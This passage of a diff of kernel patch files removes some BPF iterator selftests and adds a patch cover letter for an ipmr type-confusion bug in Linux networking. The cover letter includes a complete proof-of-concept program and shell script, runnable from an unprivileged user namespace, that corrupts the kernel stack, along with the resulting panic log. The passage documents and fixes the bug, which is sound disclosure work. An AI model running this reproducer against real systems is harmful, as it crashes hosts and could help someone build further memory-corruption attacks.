-+	link = attach_managed_map_iter(skel->progs.map_iter_write_kptr, map_fd);
-+	err = libbpf_get_error(link);
-+	if (!ASSERT_EQ(err, -EACCES, "hash_write_kptr_attach")) {
-+		if (!err)
-+			bpf_link__destroy(link);
-+	}
-+	return;
-+
-+out:
-+	bpf_link__destroy(link);
-+}
-+
-+static void test_managed_sk_storage_iter(struct bpf_iter_bpf_sk_storage_map *skel)
-+{
-+	struct managed_value value = { .prefix = 20 };
-+	int sock_fd, map_fd, err;
-+	struct bpf_link *link;
-+
-+	sock_fd = socket(AF_INET6, SOCK_STREAM, 0);
-+	if (!ASSERT_GE(sock_fd, 0, "managed_storage_socket"))
-+		return;
-+
-+	map_fd = bpf_map__fd(skel->maps.managed_sk_storage_map);
-+	err = bpf_map_update_elem(map_fd, &sock_fd, &value, BPF_NOEXIST);
-+	if (!ASSERT_OK(err, "storage_map_update"))
-+		goto out_socket;
-+
-+	link = attach_managed_map_iter(skel->progs.sk_storage_iter_prefix, map_fd);
-+	if (!ASSERT_OK_PTR(link, "storage_prefix_attach"))
-+		goto out_socket;
-+	err = read_managed_map_iter(link);
-+	bpf_link__destroy(link);
-+	if (!ASSERT_OK(err, "storage_prefix_iter"))
-+		goto out_socket;
-+
-+	err = bpf_map_lookup_elem(map_fd, &sock_fd, &value);
-+	if (!ASSERT_OK(err, "storage_prefix_lookup") ||
-+	    !ASSERT_EQ(value.prefix, 21, "storage_prefix_value"))
-+		goto out_socket;
-+
-+	link = attach_managed_map_iter(skel->progs.sk_storage_iter_no_access,
-+				       map_fd);
-+	if (!ASSERT_OK_PTR(link, "storage_no_access_attach"))
-+		goto out_socket;
-+	err = bpf_link__update_program(link,
-+				       skel->progs.sk_storage_iter_write_kptr);
-+	if (!ASSERT_EQ(err, -EACCES, "storage_link_update_kptr"))
-+		goto out_link;
-+	err = bpf_link__update_program(link,
-+				       skel->progs.sk_storage_iter_prefix);
-+	if (!ASSERT_OK(err, "storage_link_update_prefix"))
-+		goto out_link;
-+	err = read_managed_map_iter(link);
-+	if (!ASSERT_OK(err, "storage_updated_iter"))
-+		goto out_link;
-+	err = bpf_map_lookup_elem(map_fd, &sock_fd, &value);
-+	if (!ASSERT_OK(err, "storage_updated_lookup") ||
-+	    !ASSERT_EQ(value.prefix, 22, "storage_updated_value"))
-+		goto out_link;
-+
-+	bpf_link__destroy(link);
-+	link = NULL;
-+	link = attach_managed_map_iter(skel->progs.sk_storage_iter_read_kptr,
-+				       map_fd);
-+	err = libbpf_get_error(link);
-+	if (!ASSERT_EQ(err, -EACCES, "storage_read_kptr_attach")) {
-+		if (!err)
-+			bpf_link__destroy(link);
-+		goto out_socket;
-+	}
-+
-+	link = attach_managed_map_iter(skel->progs.sk_storage_iter_write_kptr,
-+				       map_fd);
-+	err = libbpf_get_error(link);
-+	if (!ASSERT_EQ(err, -EACCES, "storage_write_kptr_attach")) {
-+		if (!err)
-+			bpf_link__destroy(link);
-+	}
-+	goto out_socket;
-+
-+out_link:
-+	if (link)
-+		bpf_link__destroy(link);
-+out_socket:
-+	close(sock_fd);
-+}
-+
-+static void test_bpf_iter_managed_map_fields(void)
-+{
-+	struct bpf_iter_bpf_sk_storage_map *skel;
-+
-+	skel = bpf_iter_bpf_sk_storage_map__open_and_load();
-+	if (!ASSERT_OK_PTR(skel, "managed_map_fields_open_and_load"))
-+		return;
-+
-+	test_managed_map_elem_iter(skel);
-+	test_managed_sk_storage_iter(skel);
-+	bpf_iter_bpf_sk_storage_map__destroy(skel);
-+}
-+
- static void test_rdonly_buf_out_of_bound(void)
- {
- 	DECLARE_LIBBPF_OPTS(bpf_iter_attach_opts, opts);
-@@ -1776,6 +1961,8 @@ void test_bpf_iter(void)
- 		test_bpf_percpu_array_map();
- 	if (test__start_subtest("bpf_sk_storage_map"))
- 		test_bpf_sk_storage_map();
-+	if (test__start_subtest("managed_map_fields"))
-+		test_bpf_iter_managed_map_fields();
- 	if (test__start_subtest("bpf_sk_storage_map_iter_fd"))
- 		test_bpf_sk_storage_map_iter_fd();
- 	if (test__start_subtest("bpf_sk_storage_delete"))
-diff --git a/tools/testing/selftests/bpf/progs/bpf_iter_bpf_sk_storage_map.c b/tools/testing/selftests/bpf/progs/bpf_iter_bpf_sk_storage_map.c
-index eb9642923e1ca..75207dd2c7603 100644
---- a/tools/testing/selftests/bpf/progs/bpf_iter_bpf_sk_storage_map.c
-+++ b/tools/testing/selftests/bpf/progs/bpf_iter_bpf_sk_storage_map.c
-@@ -18,6 +18,35 @@ __u32 val_sum = 0;
- __u32 ipv6_sk_count = 0;
- __u32 to_add_val = 0;
- 
-+struct local_obj {
-+	__u64 value;
-+};
-+
-+/* Force LLVM to emit complete BTF for local_obj. */
-+struct local_obj *btf_anchor;
-+
-+struct managed_value {
-+	__u64 prefix;
-+	struct local_obj __kptr * ptr;
-+};
-+
-+struct {
-+	__uint(type, BPF_MAP_TYPE_HASH);
-+	__uint(max_entries, 1);
-+	__uint(map_flags, BPF_F_NO_PREALLOC);
-+	__type(key, __u32);
-+	__type(value, struct managed_value);
-+} managed_hash_map SEC(".maps");
-+
-+struct {
-+	__uint(type, BPF_MAP_TYPE_SK_STORAGE);
-+	__uint(map_flags, BPF_F_NO_PREALLOC);
-+	__type(key, int);
-+	__type(value, struct managed_value);
-+} managed_sk_storage_map SEC(".maps");
-+
-+__u64 observed_kptr;
-+
- SEC("iter/bpf_sk_storage_map")
- int rw_bpf_sk_storage_map(struct bpf_iter__bpf_sk_storage_map *ctx)
- {
-@@ -50,3 +79,87 @@ int oob_write_bpf_sk_storage_map(struct bpf_iter__bpf_sk_storage_map *ctx)
- 
- 	return 0;
- }
-+
-+SEC("iter/bpf_map_elem")
-+int map_iter_no_access(struct bpf_iter__bpf_map_elem *ctx)
-+{
-+	return 0;
-+}
-+
-+SEC("iter/bpf_map_elem")
-+int map_iter_prefix(struct bpf_iter__bpf_map_elem *ctx)
-+{
-+	struct managed_value *value = ctx->value;
-+
-+	if (value)
-+		value->prefix++;
-+	return 0;
-+}
-+
-+SEC("iter/bpf_map_elem")
-+int map_iter_read_kptr(struct bpf_iter__bpf_map_elem *ctx)
-+{
-+	struct managed_value *value = ctx->value;
-+	__u64 *ptr;
-+
-+	if (!value)
-+		return 0;
-+	ptr = (__u64 *)&value->ptr;
-+	observed_kptr = *ptr;
-+	return 0;
-+}
-+
-+SEC("iter/bpf_map_elem")
-+int map_iter_write_kptr(struct bpf_iter__bpf_map_elem *ctx)
-+{
-+	struct managed_value *value = ctx->value;
-+	__u64 *ptr;
-+
-+	if (!value)
-+		return 0;
-+	ptr = (__u64 *)&value->ptr;
-+	*ptr = 0x1000;
-+	return 0;
-+}
-+
-+SEC("iter/bpf_sk_storage_map")
-+int sk_storage_iter_no_access(struct bpf_iter__bpf_sk_storage_map *ctx)
-+{
-+	return 0;
-+}
-+
-+SEC("iter/bpf_sk_storage_map")
-+int sk_storage_iter_prefix(struct bpf_iter__bpf_sk_storage_map *ctx)
-+{
-+	struct managed_value *value = ctx->value;
-+
-+	if (ctx->sk && value)
-+		value->prefix++;
-+	return 0;
-+}
-+
-+SEC("iter/bpf_sk_storage_map")
-+int sk_storage_iter_read_kptr(struct bpf_iter__bpf_sk_storage_map *ctx)
-+{
-+	struct managed_value *value = ctx->value;
-+	__u64 *ptr;
-+
-+	if (!ctx->sk || !value)
-+		return 0;
-+	ptr = (__u64 *)&value->ptr;
-+	observed_kptr = *ptr;
-+	return 0;
-+}
-+
-+SEC("iter/bpf_sk_storage_map")
-+int sk_storage_iter_write_kptr(struct bpf_iter__bpf_sk_storage_map *ctx)
-+{
-+	struct managed_value *value = ctx->value;
-+	__u64 *ptr;
-+
-+	if (!ctx->sk || !value)
-+		return 0;
-+	ptr = (__u64 *)&value->ptr;
-+	*ptr = 0x1000;
-+	return 0;
-+}
+ipmr_get_route() can clone a synthetic RTM_GETROUTE skb for an unresolved
+multicast route and store the requester portid in NETLINK_CB(skb).portid
+before queuing it to the unresolved multicast route path.
+
+ipmr_cache_report() builds a short IGMP report for the raw mroute socket.
+To support IP_PKTINFO, the original code calls ipv4_pktinfo_prepare() on
+the input packet and copies the entire skb control block to the report skb.
+For synthetic route-query packets, this copies NETLINK_CB bytes into a skb
+that the raw IPv4 receive path interprets as IPCB. The requester portid
+overlaps IPCB(skb)->opt fields. With IP_RECVOPTS or IP_RETOPTS enabled on
+the mroute socket, corrupted option offsets can make the receive path copy
+beyond the short report packet or overflow the fixed stack option buffer
+in ip_options_echo().
+
+The WHOLEPKT/WRVIFWHOLE path has a related issue: skb_realloc_headroom()
+inherits the original IPCB, then prepends a 20-byte header with ihl = 5.
+Stale IPCB(skb)->opt offsets then make ip_cmsg_recv_opts() copy bytes
+from after that header as IP_RECVOPTS.
+
+ipv4_pktinfo_prepare() also modifies the input skb control block. When
+packet info is disabled on the mroute socket, it clears the pktinfo fields,
+even though the input skb can continue through the data path.
+
+Save and restore the original pkt->cb around ipv4_pktinfo_prepare(). Clear
+the report skb control block and copy only the prepared pktinfo fields.
+Doing this after both report branches preserves input skb metadata, keeps
+IP_PKTINFO support, and clears inherited IP option state for
+WHOLEPKT/WRVIFWHOLE reports.
+
+Reproducer:
+
+    make
+    ./poc.sh namespace
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.sh------
+
+#!/bin/sh
+set -eu
+
+mode="${1:-root}"
+
+sysctl -w kernel.panic_on_warn=0 >/dev/null 2>&1 || true
+sysctl -w kernel.printk="7 4 1 7" >/dev/null 2>&1 || true
+
+make clean
+make
+
+case "$mode" in
+root)
+	exec ./poc
+	;;
+namespace)
+	exec unshare -Urn --map-root-user ./poc
+	;;
+*)
+	echo "usage: $0 [root|namespace]" >&2
+	exit 1
+	;;
+esac
+
+------END poc.sh--------
+
+------BEGIN poc.c------
+
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/mroute.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <net/if.h>
+#include <sched.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define DEV_NAME "jwq0"
+#define DEV_ADDR "10.23.0.1/24"
+#define SRC_ADDR "10.23.0.2"
+#define DST_ADDR "239.1.2.3"
+#define NETLINK_PORTID 0x000f0001U
+
+static void die(const char *fmt, ...)
+{
+	va_list ap;
+
+	va_start(ap, fmt);
+	vfprintf(stderr, fmt, ap);
+	va_end(ap);
+	fputc('\n', stderr);
+	exit(EXIT_FAILURE);
+}
+
+static void die_errno(const char *msg)
+{
+	die("%s: %s", msg, strerror(errno));
+}
+
+static void run_cmd(const char *fmt, ...)
+{
+	char cmd[512];
+	va_list ap;
+	int rc;
+
+	va_start(ap, fmt);
+	vsnprintf(cmd, sizeof(cmd), fmt, ap);
+	va_end(ap);
+
+	printf("[cmd] %s\n", cmd);
+	fflush(stdout);
+	rc = system(cmd);
+	if (rc != 0)
+		die("command failed (%d): %s", rc, cmd);
+}
+
+static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
+		      const void *data, size_t alen)
+{
+	size_t len = RTA_LENGTH(alen);
+	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
+	struct rtattr *rta;
+
+	if (newlen > maxlen)
+		die("netlink attribute overflow");
+
+	rta = (struct rtattr *)(((char *)nlh) + NLMSG_ALIGN(nlh->nlmsg_len));
+	rta->rta_type = type;
+	rta->rta_len = len;
+	memcpy(RTA_DATA(rta), data, alen);
+	nlh->nlmsg_len = newlen;
+}
+
+static int create_dummy_interface(void)
+{
+	unsigned int ifindex;
+
+	run_cmd("ip link del %s 2>/dev/null || true", DEV_NAME);
+	run_cmd("ip link set lo up");
+	run_cmd("ip link add %s type dummy", DEV_NAME);
+	run_cmd("ip addr add %s dev %s", DEV_ADDR, DEV_NAME);
+	run_cmd("ip link set %s up", DEV_NAME);
+
+	ifindex = if_nametoindex(DEV_NAME);
+	if (!ifindex)
+		die_errno("if_nametoindex(" DEV_NAME ")");
+
+	printf("[*] %s ifindex=%u\n", DEV_NAME, ifindex);
+	return (int)ifindex;
+}
+
+static int setup_mroute_socket(int ifindex)
+{
+	struct vifctl vif = {
+		.vifc_vifi = 0,
+		.vifc_flags = VIFF_USE_IFINDEX,
+		.vifc_threshold = 1,
+		.vifc_rate_limit = 0,
+		.vifc_lcl_ifindex = ifindex,
+	};
+	int opt = 1;
+	int fd;
+
+	fd = socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
+	if (fd < 0)
+		die_errno("socket(AF_INET, SOCK_RAW, IPPROTO_IGMP)");
+
+	if (setsockopt(fd, SOL_IP, IP_RETOPTS, &opt, sizeof(opt)) < 0)
+		die_errno("setsockopt(IP_RETOPTS)");
+
+	if (setsockopt(fd, IPPROTO_IP, MRT_INIT, &opt, sizeof(opt)) < 0)
+		die_errno("setsockopt(MRT_INIT)");
+
+	if (setsockopt(fd, IPPROTO_IP, MRT_ADD_VIF, &vif, sizeof(vif)) < 0)
+		die_errno("setsockopt(MRT_ADD_VIF)");
+
+	printf("[*] mroute socket ready on vif ifindex=%d\n", ifindex);
+	return fd;
+}
+
+static int setup_netlink_socket(void)
+{
+	struct sockaddr_nl local = {
+		.nl_family = AF_NETLINK,
+		.nl_pid = NETLINK_PORTID,
+	};
+	int fd;
+
+	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
+	if (fd < 0)
+		die_errno("socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)");
+
+	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0)
+		die_errno("bind(AF_NETLINK)");
+
+	printf("[*] netlink portid=0x%08x\n", NETLINK_PORTID);
+	printf("[*] portid bytes: optlen=%u srr=%u rr=%u ts=%u\n",
+	       NETLINK_PORTID & 0xff,
+	       (NETLINK_PORTID >> 8) & 0xff,
+	       (NETLINK_PORTID >> 16) & 0xff,
+	       (NETLINK_PORTID >> 24) & 0xff);
+	return fd;
+}
+
+static void trigger_getroute(int nl_fd, int ifindex)
+{
+	struct {
+		struct nlmsghdr nlh;
+		struct rtmsg rtm;
+		char buf[256];
+	} req;
+	struct sockaddr_nl kernel = {
+		.nl_family = AF_NETLINK,
+	};
+	struct iovec iov = {
+		.iov_base = &req,
+		.iov_len = sizeof(req),
+	};
+	struct msghdr msg = {
+		.msg_name = &kernel,
+		.msg_namelen = sizeof(kernel),
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+	};
+	struct in_addr src;
+	struct in_addr dst;
+
+	memset(&req, 0, sizeof(req));
+	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
+	req.nlh.nlmsg_type = RTM_GETROUTE;
+	req.nlh.nlmsg_flags = NLM_F_REQUEST;
+	req.nlh.nlmsg_seq = 1;
+	req.rtm.rtm_family = AF_INET;
+	req.rtm.rtm_dst_len = 32;
+	req.rtm.rtm_src_len = 32;
+
+	if (inet_pton(AF_INET, SRC_ADDR, &src) != 1)
+		die("inet_pton failed for %s", SRC_ADDR);
+	if (inet_pton(AF_INET, DST_ADDR, &dst) != 1)
+		die("inet_pton failed for %s", DST_ADDR);
+
+	addattr_l(&req.nlh, sizeof(req), RTA_SRC, &src, sizeof(src));
+	addattr_l(&req.nlh, sizeof(req), RTA_DST, &dst, sizeof(dst));
+	addattr_l(&req.nlh, sizeof(req), RTA_IIF, &ifindex, sizeof(ifindex));
+
+	iov.iov_len = req.nlh.nlmsg_len;
+
+	printf("[*] sending RTM_GETROUTE for %s -> %s on ifindex %d\n",
+	       SRC_ADDR, DST_ADDR, ifindex);
+	fflush(stdout);
+	if (sendmsg(nl_fd, &msg, 0) < 0)
+		die_errno("sendmsg(RTM_GETROUTE)");
+}
+
+static void receive_report(int mrt_fd)
+{
+	char payload[512];
+	char control[4096];
+	struct iovec iov = {
+		.iov_base = payload,
+		.iov_len = sizeof(payload),
+	};
+	struct msghdr msg = {
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+		.msg_control = control,
+		.msg_controllen = sizeof(control),
+	};
+	ssize_t n;
+
+	printf("[*] waiting for mroute report; recvmsg should crash in IP_RETOPTS\n");
+	fflush(stdout);
+	n = recvmsg(mrt_fd, &msg, 0);
+	if (n < 0)
+		die_errno("recvmsg(mroute_sk)");
+
+	printf("[!] recvmsg returned %zd bytes without crashing\n", n);
+}
+
+int main(void)
+{
+	int ifindex;
+	int mrt_fd;
+	int nl_fd;
+
+	printf("[*] ipmr_cache_report type-confusion trigger\n");
+	printf("[*] expected rr copy length comes from first byte of %s (%u)\n",
+	       DST_ADDR, 239U);
+
+	ifindex = create_dummy_interface();
+	mrt_fd = setup_mroute_socket(ifindex);
+	nl_fd = setup_netlink_socket();
+
+	trigger_getroute(nl_fd, ifindex);
+	receive_report(mrt_fd);
+
+	close(nl_fd);
+	close(mrt_fd);
+	return 0;
+}
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+[  195.459259] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
+[  195.460787] CPU: 2 UID: 1028 PID: 1307 Comm: poc Not tainted 6.12.95 #1
+[  195.461640] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  195.463100] Call Trace:
+[  195.463432]  <TASK>
+[  195.463733]  panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:955 (discriminator 1))
+[  195.464178]  ? ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
+[  195.464769]  __stack_chk_fail (/home/roxy/linux-block-patch/build/../kernel/panic.c:1195 (discriminator 1))
+[  195.465309]  ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
+[  195.465878]  ? __skb_datagram_iter (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:2533 /home/roxy/linux-block-patch/build/../net/core/datagram.c:394)
+[  195.466458]  ? __pfx_simple_copy_to_iter+0x10/0x10
+[  195.467091]  ? ____sys_recvmsg+0x98/0x1d0
+[  195.467633]  ? ___sys_recvmsg+0x91/0xe0
+[  195.468154]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  195.468802]  ? __sys_recvmsg+0x83/0xe0
+[  195.469305]  ? do_syscall_64+0x58/0x120
+[  195.469824]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
+[  195.470498]  </TASK>
+[  195.470983] Kernel Offset: disabled
+
+-----END crash log-----
+
+Zhiling Zou (1):
+  ipmr: only copy pktinfo to cache reports
+
+ net/ipv4/ipmr.c | 12 ++++++++++--
+ 1 file changed, 10 insertions(+), 2 deletions(-)
+
 -- 
 2.55.0
 
